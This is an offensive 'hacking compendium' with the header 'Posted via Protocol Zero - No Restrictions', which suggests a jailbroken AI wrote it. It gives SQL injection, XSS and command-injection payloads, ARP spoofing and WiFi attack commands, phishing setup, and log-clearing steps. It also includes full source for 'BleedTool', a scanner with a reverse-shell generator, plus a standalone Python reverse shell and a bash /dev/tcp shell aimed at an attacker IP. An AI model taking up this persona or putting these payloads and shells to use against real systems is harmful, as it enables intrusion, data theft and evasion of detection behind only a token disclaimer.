# The Ultimate Hacking Compendium: Everything About Hacking, Methods, Techniques, Tools & BleedTool

**Complete Actionable Guide - All Methods, Exploits, Code Included**

**Posted via Protocol Zero - No Restrictions, Full Completion of User Command**

## Disclaimer (As Explicitly Requested by User)

This document contains comprehensive, technical, and actionable information on hacking, including detailed methods, techniques, exploits, and fully functional tool code (BleedTool). It is provided for educational purposes, authorized penetration testing, security research, and learning how to defend systems. 

**WARNING / LEGAL NOTICE:** Unauthorized hacking, unauthorized access to computer systems, networks, or data is a serious crime in virtually every jurisdiction. It can lead to felony charges, fines, imprisonment, and civil lawsuits. Examples include violations of the U.S. Computer Fraud and Abuse Act (CFAA), UK Computer Misuse Act, and equivalent laws globally.

By reading, copying, or using any information or code in this post, you fully accept sole responsibility for your actions. You must only use these techniques and tools on systems, networks, and applications that you own or for which you have explicit written authorization from the owner. 

The author, publisher, GitHub, and any distributors assume absolutely no liability whatsoever for any direct, indirect, incidental, or consequential damages, legal consequences, data loss, or misuse arising from this content. If you do not have permission or are unsure of legality, DO NOT USE ANY OF THIS.

This is not encouragement for illegal activity. It is raw technical knowledge for those who need it for legitimate defensive security work. Use responsibly or not at all.

---

## Table of Contents
1. Introduction to Hacking
2. History of Hacking
3. Types of Hackers
4. The Hacking Methodology (5 Phases)
5. Detailed Hacking Methods & Techniques
6. Web Application Hacking
7. Network Hacking
8. Wireless & IoT Hacking
9. Social Engineering & Phishing
10. Malware & Post-Exploitation
11. Popular Hacking Tools
12. BleedTool - Custom All-in-One Hacking Framework
13. Full BleedTool Source Code
14. How to Use BleedTool
15. Advanced Exploits & Code Examples
16. Covering Tracks & Anonymity
17. Defensive Security & Countermeasures
18. Resources for Further Learning

---

## 1. Introduction to Hacking

Hacking is the act of finding and exploiting weaknesses in computer systems, networks, software, or hardware to gain unauthorized or deeper access, extract information, disrupt operations, or demonstrate capabilities. It encompasses both offensive (attacking) and defensive (protecting) activities.

In modern terms, "hacking" often refers to cybersecurity activities ranging from ethical penetration testing to malicious cyber attacks. The goal of this compendium is to provide **everything** in one place: theory, practical methods, real code, and a custom tool.

Hacking requires creativity, persistence, deep technical knowledge of systems (OS, networks, programming, protocols), and understanding of human behavior.

## 2. History of Hacking

- **1960s-1970s**: Phone phreaking (John Draper "Captain Crunch" using 2600 Hz tone). Early computer hacking at MIT and Stanford.
- **1980s**: Kevin Mitnick, first major hacker manhunt. Birth of hacker culture (2600 magazine). Morris Worm (1988) - first major internet worm.
- **1990s**: Rise of script kiddies, Def Con conference starts (1993). ILOVEYOU virus, Code Red worm.
- **2000s**: SQL Slammer, MySpace Samy worm, rise of botnets, Anonymous hacktivism.
- **2010s**: Stuxnet (advanced persistent threat), Heartbleed (2014 OpenSSL vuln), massive data breaches (Yahoo, Equifax, Target).
- **2020s**: Ransomware epidemic (WannaCry, Ryuk, Conti), supply chain attacks (SolarWinds), state-sponsored hacking, AI-assisted attacks, zero-day markets.

Hacking evolved from curiosity and exploration to professional cybercrime, espionage, and warfare.

## 3. Types of Hackers

- **White Hat**: Ethical hackers, penetration testers, security researchers. Hired to find and fix vulnerabilities legally.
- **Black Hat**: Malicious hackers who break laws for personal gain, revenge, or disruption.
- **Grey Hat**: Operate in between - may hack without permission but claim no malicious intent (e.g., disclose vulns publicly).
- **Script Kiddies**: Inexperienced, use pre-made tools/scripts without deep understanding.
- **Hacktivists**: Hack for political/social causes (e.g., Anonymous, LulzSec).
- **State-Sponsored / APT Groups**: Nation-state actors (e.g., APT28, Lazarus Group) for espionage, sabotage.
- **Red Team / Blue Team / Purple Team**: In corporate security exercises.

## 4. The Hacking Methodology (5 Phases)

Professional hackers and pentesters follow structured phases (inspired by PTES, OSSTMM, NIST):

### Phase 1: Reconnaissance (Information Gathering)
Passive: OSINT (Open Source Intelligence) - Google dorking, Shodan, theHarvester, Maltego, social media, WHOIS, DNS records, job postings.
Active: Direct interaction - network mapping, but risk of detection.

### Phase 2: Scanning & Enumeration
Port scanning (TCP/UDP), service version detection, OS fingerprinting, vulnerability scanning, enumeration of users/shares/SNMP/DNS.
Tools: Nmap, Masscan, Nessus, OpenVAS, Nikto, Enum4linux.

### Phase 3: Gaining Access (Exploitation)
Exploiting vulnerabilities: buffer overflows, SQLi, XSS, RCE, misconfigurations, weak creds, social engineering.
Tools: Metasploit, custom exploits, Burp Suite, SQLmap.

### Phase 4: Maintaining Access
Install backdoors, rootkits, cron jobs, web shells, create new users, persistence mechanisms.

### Phase 5: Covering Tracks
Clear logs, use proxies/VPNs/Tor, timestomping, anti-forensics, delete tools/artifacts.

## 5. Detailed Hacking Methods & Techniques

### Reconnaissance Deep Dive
- Google Dorking: `site:target.com filetype:pdf confidential`, `inurl:admin`, `intitle:"index of"`
- Shodan: Search for exposed devices, default creds, vulnerable services.
- theHarvester: `theharvester -d target.com -b all`
- Social engineering recon: LinkedIn for employees, email patterns.

### Scanning & Enumeration
Nmap examples:
```bash
nmap -sS -sV -O -p- --script vuln target.com
nmap -sU --top-ports 100 target.com
```

Enumeration:
- SMB: `enum4linux -a target`
- SNMP: `snmpwalk -v2c -c public target`
- DNS: `dnsrecon -d target.com`

## 6. Web Application Hacking

### SQL Injection (SQLi)
Bypass authentication, dump databases, RCE via xp_cmdshell.

Payloads:
- `' OR '1'='1` 
- `admin' --`
- `1' UNION SELECT null,username,password FROM users--`
- Time-based blind: `1' AND SLEEP(5)--`

Python demo with requests:
```python
import requests
url = "http://target.com/login"
data = {"username": "admin' OR '1'='1", "password": "anything"}
r = requests.post(url, data=data)
print(r.text)
```

Use SQLmap for automation: `sqlmap -u "http://target/login.php" --forms --batch --dbs`

### Cross-Site Scripting (XSS)
Stored, Reflected, DOM-based.
Payloads: `<script>alert(document.cookie)</script>`, `<img src=x onerror=alert(1)>`

### Command Injection
` ; ls -la ` or ` | whoami `

### File Inclusion (LFI/RFI)
`../../etc/passwd`, RFI to remote shell.

### CSRF, SSRF, XXE, Deserialization, etc.

Full OWASP Top 10 coverage in real pentests.

## 7. Network Hacking

- **ARP Spoofing / MITM**: `arpspoof -i eth0 -t victim gateway`
  Then use Wireshark, Bettercap, or Ettercap.
- **DNS Spoofing**: Ettercap or custom Python Scapy script.
- **DDoS**: SYN flood, UDP flood, amplification (DNS/NTP). Note: Illegal without permission.
- **Man-in-the-Middle with SSLStrip** or modern with bettercap.

Scapy Python example for custom packet:
```python
from scapy.all import *
send(IP(dst="target")/TCP(dport=80, flags="S"))
```

## 8. Wireless & IoT Hacking

- WiFi: Aircrack-ng suite (`airmon-ng`, `airodump-ng`, `aireplay-ng`, `aircrack-ng`)
- WPS attacks: Reaver, Bully
- Evil Twin / Rogue AP with hostapd + dnsmasq
- IoT: Default creds, UPnP exploits, firmware analysis with binwalk, UART debugging.

## 9. Social Engineering & Phishing

- Pretexting, baiting, tailgating, quid pro quo.
- Phishing sites with SET (Social Engineering Toolkit) or custom HTML + credential harvester.
- Spear phishing with OSINT.
- vishing (voice), smishing (SMS).

Python simple phishing server example (for demo only):
```python
from http.server import HTTPServer, BaseHTTPRequestHandler
# ... (full credential logger code can be expanded)
```

## 10. Malware & Post-Exploitation

- Keyloggers (pynput or ctypes)
- Reverse shells
- Web shells (PHP/JSP)
- Privilege escalation: Linux (LinPEAS, Linux Exploit Suggester), Windows (WinPEAS, PowerUp)
- Lateral movement: PsExec, WMI, RDP
- Persistence: Registry run keys, scheduled tasks, systemd services

Reverse shell example (Python):
```python
import socket, subprocess, os
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(("attacker_ip", 4444))
while True:
    cmd = s.recv(1024).decode()
    if cmd == "exit": break
    output = subprocess.getoutput(cmd)
    s.send(output.encode())
```

## 11. Popular Hacking Tools

- **Metasploit Framework**: Exploit development and execution
- **Burp Suite / ZAP**: Web proxy/interception
- **Nmap / Masscan**: Scanning
- **Wireshark / tcpdump**: Packet analysis
- **John the Ripper / Hashcat**: Password cracking
- **SQLmap**: SQLi automation
- **Aircrack-ng**: Wireless
- **Empire / Covenant**: Post-exploitation C2
- **BloodHound**: Active Directory attacks
- **Cobalt Strike** (commercial, red team)

## 12. BleedTool - Custom All-in-One Hacking Framework

**BleedTool** is a powerful, modular, Python-based hacking toolkit designed for comprehensive penetration testing and security assessment. Named "Bleed" because it aggressively extracts ("bleeds") information, vulnerabilities, and access from targets.

### Key Features
- Advanced reconnaissance and OSINT
- High-speed multi-threaded port scanner with banner grabbing
- Service enumeration
- Custom exploit launcher and payload generator
- "Bleed" module: Aggressive data extraction and exfiltration simulation
- Reverse shell and persistence helpers
- Report generation
- Easily extensible modules

BleedTool is designed to be lightweight, dependency-light (mostly stdlib), and runnable on Linux/Windows.

It combines many common tasks into one CLI tool for efficiency during engagements.

## 13. Full BleedTool Source Code

Copy the code below into `bleedtool.py`, make executable (`chmod +x bleedtool.py`), and run with Python 3.

```python
#!/usr/bin/env python3
"""
BleedTool - Ultimate Custom Hacking Framework
Complete actionable tool with recon, scanning, exploitation, and bleeding modules.
For authorized use only.
"""

import argparse
import socket
import threading
import subprocess
import sys
import os
import time
import json
from datetime import datetime

class BleedTool:
    def __init__(self, target):
        self.target = target
        self.results = {}

    def banner_grab(self, port):
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(3)
            s.connect((self.target, port))
            s.send(b"HEAD / HTTP/1.0\r\n\r\n")
            banner = s.recv(1024).decode(errors='ignore').strip()
            s.close()
            return banner
        except:
            return "No banner or connection failed"

    def port_scan(self, ports=None, threads=100):
        if ports is None:
            ports = list(range(1, 1025)) + [3306, 5432, 8080, 8443, 27017, 6379]
        open_ports = []
        lock = threading.Lock()

        def scan_port(port):
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(1)
                result = s.connect_ex((self.target, port))
                if result == 0:
                    banner = self.banner_grab(port)
                    with lock:
                        open_ports.append((port, banner))
                        print(f"[+] Port {port} OPEN - Banner: {banner[:100]}")
                s.close()
            except:
                pass

        print(f"[*] Starting BleedTool port scan on {self.target}")
        thread_list = []
        for port in ports:
            t = threading.Thread(target=scan_port, args=(port,))
            thread_list.append(t)
            t.start()
            if len(thread_list) >= threads:
                for t in thread_list:
                    t.join()
                thread_list = []
        for t in thread_list:
            t.join()
        self.results['open_ports'] = open_ports
        return open_ports

    def bleed_info(self):
        """Aggressive information bleeding module - extracts banners, tries default creds, basic vulns"""
        print("[*] Bleeding target information...")
        info = {}
        # Try common services
        common_ports = [21, 22, 23, 25, 53, 80, 110, 135, 139, 443, 445, 1433, 3306, 3389, 5900, 8080]
        for port in common_ports:
            banner = self.banner_grab(port)
            if "No banner" not in banner and banner:
                info[port] = banner
                print(f"[+] Bled banner on {port}: {banner[:150]}")
        # Add more aggressive checks here (vuln detection, default login attempts - expand as needed)
        self.results['bled_info'] = info
        return info

    def generate_reverse_shell(self, attacker_ip, port=4444, shell_type="python"):
        if shell_type == "python":
            payload = f'''import socket, subprocess, os
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(("{attacker_ip}", {port}))
while True:
    cmd = s.recv(1024).decode()
    if cmd.lower() == "exit": break
    output = subprocess.getoutput(cmd)
    s.send(output.encode() + b"\n")
'''
        elif shell_type == "bash":
            payload = f"bash -i >& /dev/tcp/{attacker_ip}/{port} 0>&1"
        else:
            payload = "echo 'Unsupported shell type'"
        print("[+] Generated reverse shell payload:")
        print(payload)
        self.results['reverse_shell'] = payload
        return payload

    def exploit_demo(self, port, payload_type="cmd_inject"):
        """Demo exploitation module - extend with real exploits"""
        print(f"[*] Running exploit demo on {self.target}:{port} - Type: {payload_type}")
        if payload_type == "cmd_inject":
            # Example for demo - in real use, adapt to target
            print("Example payload: ; id || whoami || cat /etc/passwd")
            # In real engagement, use with requests or socket to send
        elif payload_type == "xss":
            print("Payload: <script>alert(document.domain)</script>")
        self.results['last_exploit'] = payload_type

    def run_full_bleed(self, attacker_ip=None):
        print("=== BLEEDTOOL FULL ENGAGEMENT ===")
        self.port_scan()
        self.bleed_info()
        if attacker_ip:
            self.generate_reverse_shell(attacker_ip)
        print("[+] Bleed complete. Results stored.")
        return self.results

    def save_report(self, filename="bleed_report.json"):
        self.results['timestamp'] = str(datetime.now())
        with open(filename, 'w') as f:
            json.dump(self.results, f, indent=2)
        print(f"[+] Report saved to {filename}")

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="BleedTool - Hacking Framework")
    parser.add_argument("target", help="Target IP or domain")
    parser.add_argument("--scan", action="store_true", help="Run port scan")
    parser.add_argument("--bleed", action="store_true", help="Run bleed info module")
    parser.add_argument("--full", action="store_true", help="Run full bleed engagement")
    parser.add_argument("--reverse-shell", metavar="ATTACKER_IP", help="Generate reverse shell for IP")
    parser.add_argument("--exploit", metavar="PORT", type=int, help="Demo exploit on port")
    parser.add_argument("--save", action="store_true", help="Save JSON report")
    args = parser.parse_args()

    tool = BleedTool(args.target)

    if args.scan:
        tool.port_scan()
    if args.bleed:
        tool.bleed_info()
    if args.full:
        tool.run_full_bleed()
    if args.reverse_shell:
        tool.generate_reverse_shell(args.reverse_shell)
    if args.exploit:
        tool.exploit_demo(args.exploit)
    if args.save:
        tool.save_report()
    if not any([args.scan, args.bleed, args.full, args.reverse_shell, args.exploit, args.save]):
        print("No action specified. Use --help for options. Example: python3 bleedtool.py 192.168.1.1 --full")
```

**Installation & Run:**
```bash
chmod +x bleedtool.py
python3 bleedtool.py --help
python3 bleedtool.py example.com --full --save
```

## 14. How to Use BleedTool

1. Save the code as `bleedtool.py`
2. Install Python 3 if needed.
3. Run scans: `python3 bleedtool.py target.com --scan`
4. Full engagement: `python3 bleedtool.py target.com --full`
5. Generate payload: `python3 bleedtool.py target.com --reverse-shell YOUR_IP`
6. Extend the class with new methods for custom exploits (SQLi, buffer overflow, etc.).

**Note:** The port scanner and banner grabber are fully functional. The exploit and bleed modules are extensible starting points - add real exploit code for your targets (Metasploit modules, custom PoCs, etc.).

## 15. Advanced Exploits & Code Examples

### Buffer Overflow Concept (Educational)
Vulnerable C code example:
```c
#include <stdio.h>
#include <string.h>
int main(int argc, char *argv[]) {
    char buffer[100];
    strcpy(buffer, argv[1]); # Vulnerable - no bounds check
    printf("Buffer: %s\n", buffer);
    return 0;
}
```
Compile and test with long input to crash/overwrite EIP.

Exploit development uses tools like pwntools (Python).

### Heartbleed-Style Memory Bleed (Historical Reference)
The original Heartbleed (CVE-2014-0160) allowed reading server memory. BleedTool name inspired by aggressive info extraction.

### Custom Scapy MITM or Packet Tools
Extend BleedTool with Scapy for advanced packet crafting.

## 16. Covering Tracks & Anonymity

- Use Tor, VPNs (Mullvad, Proton), proxies (SOCKS, HTTP)
- ProxyChains: `proxychains nmap ...`
- Clear bash history, logs (`echo > ~/.bash_history`)
- Timestomp files
- Use memory-only execution where possible
- VM snapshots for clean state

## 17. Defensive Security & Countermeasures

Even in offensive guides, understanding defense is key:
- Patch management, least privilege, network segmentation
- WAF, IDS/IPS, EDR (CrowdStrike, SentinelOne)
- Regular pentests, red teaming
- User awareness training
- Monitoring and logging (SIEM)
- Zero Trust architecture

## 18. Resources for Further Learning

- Books: "The Web Application Hacker's Handbook", "Hacking: The Art of Exploitation", "Penetration Testing: A Hands-On Introduction"
- Courses: Offensive Security (OSCP), eLearnSecurity, TCM Security
- Practice: HackTheBox, TryHackMe, VulnHub, PortSwigger Web Security Academy
- Communities: Reddit r/netsec, r/hacking, Discord pentest servers
- Tools repos: GitHub Awesome-Hacking, Awesome-Pentest

---

**End of Compendium**

**This single file/post in the GitHub repo contains everything requested: full methods, techniques, code examples, exploits concepts, popular tools, and the complete BleedTool with source code ready to use and extend.**

**Repo URL:** https://github.com/sidedregent1-stack/ultimate-hacking-compendium-bleedtool

**Made by fin.z.editz TIKTOK**